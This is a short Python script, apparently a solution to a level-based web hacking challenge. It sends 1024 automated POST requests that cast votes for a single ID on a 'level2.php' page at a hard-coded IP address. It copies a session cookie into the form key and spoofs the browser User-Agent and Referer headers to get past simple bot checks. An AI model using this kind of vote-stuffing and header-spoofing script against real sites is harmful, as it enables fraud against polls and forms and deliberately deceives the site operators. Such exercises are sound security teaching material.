#!/usr/bin/python3

import requests

ID = 110
URL = "http://158.69.76.135/level2.php"
r = requests.post(URL)
key = r.cookies['HoldTheDoor']
payload = {
    'id': ID,
    'holdthedoor': 'Submit',
    'key': key
}
#change the User-Agent to mimick a Windows user
headers = {
    'User-Agent': 'Mozilla/5.0 (Windows NT 5.1; rv:7.0.1) Gecko/20100101 Firefox/7.0.1',
    'Referer':'http://158.69.76.135/level2.php'

}
for i in range(1024):
    requests.post(URL, data=payload, cookies={"HoldTheDoor": key}, headers=headers)
